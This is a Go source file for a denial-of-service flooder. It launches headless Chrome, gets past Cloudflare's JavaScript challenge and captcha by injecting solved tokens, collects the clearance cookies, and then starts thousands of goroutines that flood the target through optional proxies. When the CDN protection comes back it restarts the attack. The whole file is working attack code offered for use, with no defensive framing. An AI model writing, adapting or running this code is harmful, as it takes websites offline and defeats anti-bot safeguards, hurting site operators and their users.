package  main

import (
	"fmt"
	"github.com/sclevine/agouti"
	"math/rand"
	"net/url"
	"strings"
	"time"
)

type Loader struct {
	target string
	duration time.Duration
	slots int
	proxylist []string
}

func (l Loader) Run() {
	target := l.target
	duration := l.duration
	slots := l.slots
	firstTime := time.Now()
	firstRun := false
	targetUri, err := url.Parse(target)
	if err != nil {
		fmt.Println(err)
	}
	userAgent := userAgents[rand.Intn(len(userAgents))]
	dr := agouti.ChromeDriver(
	    agouti.ChromeOptions("args", []string{
	   		"--disable-gpu",
	   		"--no-sandbox",
	   		"--headless",
	   		"--start-maximized",
	   		"--user-agent=" + userAgent,
	    }),
	)
	if err := dr.Start(); err != nil {
		fmt.Println(err)
		return
	}
	defer dr.Stop()
	page, err := dr.NewPage()
	if err != nil {
		fmt.Printf("failed to open page, err:%s", err.Error())
		return
	}
	defer page.CloseWindow()
	page.SetPageLoad(10000)
	page.SetScriptTimeout(10000)
startAttack:
	if err := page.Navigate(target); err != nil {
		fmt.Println(err)
	}
	for html, _ := page.HTML(); strings.Contains(html, "__cf_chl_jschl_tk__"); html, _ = page.HTML() {
		time.Sleep(time.Second * 1)
	}
	time.Sleep(time.Second * 3)
	for html, _ := page.HTML(); strings.Contains(html, "__cf_chl_captcha_tk__"); html, _ = page.HTML() {
		if pageurl, err := page.URL(); err == nil {
			answer := strings.Trim(getAnswer(pageurl, userAgent), "\n")
			page.RunScript(`document.getElementsByName("g-recaptcha-response")[0].value = "` + answer + `"`, nil, nil)
			page.RunScript(`document.getElementsByName("h-captcha-response")[0].value = "` + answer + `"`, nil, nil)
			page.RunScript("document.querySelector('.challenge-form').submit()", nil, nil)
		} else {
			fmt.Println(err)
		}
		if err := page.Navigate(target); err != nil {
			fmt.Println(err)
		}
		time.Sleep(time.Second * 3)
	}
	time.Sleep(time.Second * 3)
	cookieString := ""
	if cookie, err := page.GetCookies(); err == nil {
		for _, aCookie := range cookie {
			cookieString += aCookie.Name + "=" + aCookie.Value + "; "
		}
	} else {
		fmt.Println(err)
	}
	fmt.Println(strings.Trim(cookieString, "; "))
	ssl := false
	if targetUri.Scheme == "https" {
		ssl = true
	}
	running := true
	ready := false
	client := new(cdnFlooder)
	client.method = "get"
	client.domain = targetUri.Host
	if targetUri.Port() != "" {
		client.port = targetUri.Port()
	} else {
		if ssl {
			client.port = "443"
		} else {
			client.port = "80"
		}
	}
	client.path = targetUri.Path
	client.ssl = ssl
	client.userAgent = userAgent
	client.cookie = strings.Trim(cookieString, "; ")
	if len(l.proxylist) > 0 {
		client.proxy = true
	}
	client.proxyList = l.proxylist
	for i := 0; i < slots * 1000; i++ {
		go client.Run(&running, &ready, []byte(client.GeneratePacket()))
	}
	ready = true
	if !firstRun {
		firstTime = time.Now().Add(duration)
		firstRun = true
	}
	for {
		if time.Now().After(firstTime) {
			fmt.Println("timeout")
			running = false
			break
		} else if !client.CheckCDN() {
			fmt.Println("cdn appeared")
			running = false
			goto startAttack
		}
		time.Sleep(time.Millisecond * 100)
	}
}